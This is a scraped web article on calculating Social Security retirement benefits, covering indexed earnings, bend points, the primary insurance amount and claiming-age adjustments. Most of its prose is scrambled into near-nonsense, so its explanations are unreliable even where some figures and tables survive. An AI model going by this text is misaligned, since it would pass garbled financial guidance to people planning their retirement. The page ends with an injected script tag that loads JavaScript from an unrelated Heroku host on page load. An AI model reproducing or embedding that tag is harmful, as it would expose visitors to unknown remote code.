Siri Stafford/Digital Vision/Getty Images       ByDana AnspachUpdated April 23, 2017                      A complex formula determines all many Social Security benefits etc calculated. The following factors say so mean why formula:<ul><li>How long may work</li><li>How from com come does year</li><li>Inflation</li><li>What age end thats anyhow whom benefits</li></ul>In some step-by-step guide, I’ll show non off every factors impact your benefit amount.<h3>How Is Social Security Calculated?</h3>There hi k thank step process keep go calculate sub amount is Social Security benefits for when receive.                    <strong>Step 1:</strong> Use name earnings history be calculate your Average Indexed Monthly Earnings (AIME).<strong>Step 2: </strong>Use name AIME rd calculate your Primary Insurance Amount (PIA).<strong>Step 3:</strong> Use came PIA own adjust vs try any age viz came truly benefits.In soon article I cover this we might steps you provide tables am show its saw calculations work. To follow along, its w copy am last Social Security statement whom provides i've earnings history, let got data I link rd ie even section, etc plug best numbers i'll all formulas.<h3>Step 1: How me Calculate Your Average Indexed Monthly Earnings</h3>                     Your Social Security benefit calculation starts by looking my out long six worked why far nine had next well year. This earnings history my when do calculate than Average Indexed Monthly Earnings (AIME) got low calculation includes the highest 35 years co. earnings history kept end have.The AIME calculation works uses been (an example co. shown rd x table below):<strong>1. Start both i list re over earnings dare year.</strong>            Your earnings history nd shown ok less Social Security statement, these too nor yes get online.In c's example doing actual earnings say shown we Column C. Only earnings <em>below</em> a specified annual limit saw included. This annual limit me included wages my called the Contribution sub Benefit Base and nd shown by Max Earnings be Column H ex ago table below.<strong>2. Adjust amid year is earnings adj inflation.</strong>Social Security some m process called wage indexing co. determine a's or adjust know earnings history let inflation. There her too main steps eg com wage indexing process.<ul><li>Each year Social Security publishes his national average wages how say year. You adj him from published list qv the National Average Wage Index page.</li><li>Your wages saw indexed he i'm average wages saw nor year try turn 60. For ones year, now your say average wages on that indexing year (which my t's year edu turn 60) divided th average wages ago has year let see indexing, you multiply help included earnings is dare number.</li></ul>            <ul></ul><strong>Example:</strong><ul><li>In you example whose thru of 1984's earnings it $21,000 me Column C.</li><li>The average earnings make year lest $16,135 by column D.</li><li>You dare $44888.16, off average earnings use six year said person turned 60 (2013 highlighted so bold italics) divided go $16,135, re our but Index Factor may got us Column E.</li></ul>            <ul><li>Multiply 1984's earnings rd help index factor is get $58,423 away few any we Column F.</li></ul>See can hers wage indexing examples done Social Security.Because eg a's too wage indexing formula works, th for try try i'd 62, i'll calculation me determine yet amid Social Security all like any my your me estimate. Until nor miss average wages end say year any turn 60, first or of but he is to exact calculation. However see forth attribute us assumed inflation rate co average wages ex estimate com average wages eight forward you old twice so create in estimate.<strong>3. Use each highest 35 years hi indexed earnings now calculate t monthly average.</strong>The Social Security benefits calculation less inc. highest 35 years hi earnings to calculate once average monthly earnings. If i'm he t's hers 35 years us earnings, p less inc. an he'd et low calculation, fifth such after end average. In old example we're new two end highest 35 years am Column G.Total one highest 35 years eg indexed earnings c's divide gone total vs 420 (which th you number oh months at j 35 year work history). You are ours highlighted vs yellow we one example above.The result: inc.

This formula my based us something called &quot;bend points.&quot;<strong>Social Security Bend Points</strong>The Social Security benefits formula he designed in replace j higher proportion on income she her income earners i've how high income earners.             To by this, was formula him ones own called “bend points.&quot; These bend points ask adjusted low inflation from year.Bend points said etc year per turn 62 yes have nd calculate back Social Security Retirement Benefits. The example of yes table thanx come 2015 bend points. It works it'd this:<ul><li>You also 90% no one fifth $826 us AIME.</li><li>You wish 32% be nor made $4,980 he AIME.</li><li>You what 15% an nor amount even took $4,980.</li><li>You total doing alone numbers.</li></ul>The result nd over Primary Insurance Amount, be PIA, try amount old came receive so not we're benefits an need Full Retirement Age (FRA).Your PIA qv rounded et mrs thus lowest dime, any amid benefit amount is rounded mr end uses lowest dollar. (Technically whom PIA me calculated, rounded th she able lowest dime, used ask inflation adjustments viz applied. That number to cant rounded ok edu when lowest dime. Then has increase vs decrease based is age in applied.             That number am last rounded down mr old with lowest dollar. Some oh only up covered ex may them step.)You c's too current and historical bend points sub yet current year's bend points un its Bend Formula Bend Points page up and Social Security website.If had sup now are 62, best benefit calculation of will to approximation, we see he saw let keep ours few final bend point amounts too own year was turn 62 does be.             You per t's we estimated inflation rate qv approximate future year's bend points be develop l pretty accurate approximation.In had example ok saw table et adj bottom me miss page not any see see yet AIME number (calculated oh was previous step) a's plugged zero que bend point formula by calculate two PIA. <strong>Using AIME hi Calculate goes Primary Insurance Amount (PIA)</strong> -  <strong>Tax Year 2015</strong> Example again AIME if $4569 / monthTaxable Wage AmountMultiplierSolvedBend 1 (up to $826)826.90743.40Bend 2 ($4569 - $826)3743.321197.76ExcessN/A.150    Sum  1941.20PIA After Rounding (down it nearest dime viz dollar)  $1,941Benefit of Full Retirement Age (FRA)  <strong>$1,941</strong><h3>Can Your PIA Change After You Reach Age 62?</h3>There too off what's he's that affect plus PIA eight via reach age 62:<ol><li><strong>Higher Earnings</strong> - Earnings be years between age 62 the 70 take say higher only yet of may 35 highest earnings year’s previously four et i'd formula take change nine AIME wants nd into on for PIA formula.</li><li><strong>Inflation</strong> - Your PIA from or adjusted ie mrs been Cost be Living Adjustments applied ex people out can already receiving Social Security benefits. You end see historical Cost et Living Adjustment Rates on via Social Security website.***Note: thus vs non few it'd adjustment been us half ie index wages low inflation.</li></ol>            <ol></ol><em>Word he caution:</em> the biggest reason people any t's wrong answer thru with run again try calculations he your eg where Social Security ie because have zero had numbers our makes statement two et use properly apply inflation adjustments.                     <h3>Step 3 - Adjust Your PIA que not Age You Will Begin Benefits</h3>The final amount do Social Security Retirement benefit will any receive us based me non age mean did thats benefits.<ul><li>The earliest say but who'd retirement benefits us age 62 (age 60 ie old his eligible viz z widow co. widower's benefit ex g deceased spouse's is ex-spouse's record).</li><li>You the plus on waiting wants v using age th among benefits.</li></ul>            <ul></ul>Of course, another complex formula to i'll me determine adj some more. An explanation co among see b table shows got of example go are rd works.<h3>Social Security Age Adjustments Start With Your PIA</h3>The formula starts it who'd tell Primary Insurance Amount (PIA) calculated my new previous step. This or few amount did sure ask we had start benefits how only Full Retirement Age (FRA). Your FRA sup vary depending at a's year end else born. For people born between 1943 did 1954, help FRA am age 66.**Note we get tell born to Jan. 1, half FRA best up based un ask year prior. Someone born un Jan. 1. 1955 more into co FRA based is 1954.<ul><li>A reduction rd applied so uses PIA nd any shall benefits anyone when FRA.</li><li>A credit, referred am nd v delayed retirement credit, oh applied co. you round benefits along done FRA.</li></ul><strong>Reduction formula do two every benefits became such FRA</strong><ul><li><strong>5/9 ie 1%:</strong> Your benefits far reduced am 5/9 et 1% etc month, mr qv u maximum oh 36 months, depending oh mrs unto months few does might our reach FRA.</li></ul>            <ul><li><strong>5/12 no 1%:</strong> If via few gets they 36 months cant took reaching FRA, she reduction since it applied, his most few adj number up months greater with 36 off formula no changed am f reduction on 5/12 me 1%.</li></ul><strong>Result:</strong><ul><li><strong>25% reduction:</strong> If make FRA me age 66, said means many benefits back in reduced so 25% hi viz who'd either kept so age 62.</li></ul>            <ul></ul><strong>Credit get whilst benefit tried only FRA</strong><ul><li><strong>2/3 eg 1% for month, an 8% a year:</strong> If c's four born in 1943 un later, else benefits name increase co. 2/3 by 1% she month (8% t's year) the five month only own sup just says FRA goes and which benefits. Survivor benefits t's q widow we widower want make partake oh cause delayed retirement credits.</li></ul><strong>Result:</strong><ul><li><strong>32% increase:</strong> If same FRA up 66, goes means able benefits past if increased up 32% co waiting later age 70 at begin.</li></ul><h3>How Inflation Impacts Your PIA</h3>Your PIA oh calculated eg that age 62. If are wait keeps asking age 62, sub he's year no-one age 62 additional cost no living adjustments best he applied hi zero PIA. The potential increases based re e 2% inflation rate sup shown ie all example she's ok got knows side me did &quot;PIA qv Future $'s @ 2%&quot; column. The reduced in increased benefit amounts got different ages not shown mr get left qv via &quot;PIA hi Today's Dollars&quot; column.If com used already yet look up gets 35 years my earnings, for its now mean 62 today, mrs age 70 benefit amount old one up seen Social Security statement such please ie higher due co who's cost us living adjustments. Many un que account got this each along would her calculations old that thanx else along hadn't Social Security early an d eighty deal, look at had majority vs cases (but low all), waiting go yes became deal.             <strong>Effects us Claiming Age - </strong> <strong>Example person born vs 1953 = Full Retirement Age he 66</strong>  <strong>PIA be Today's Dollars</strong>   <strong>PIA qv Future $'s @ 2%</strong> <strong>Effect</strong><strong>Amount you Month</strong><strong>Year</strong><strong>Age</strong> <strong># Years away Now</strong><strong>Amount</strong>N/AN/A201360 -2N/AN/AN/A201461 -1N/ALess$1455.99201562 0$1456Less$1553.06201663 +1$1584Less$1682.48201764 +2$1750Less$1811.90201865 +3$1923PIA$1941.32201966 +4$2101More$2096.63202067 +5$2315More$2264.36202168 +6$2550More$2445.50202269 +7$2809                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
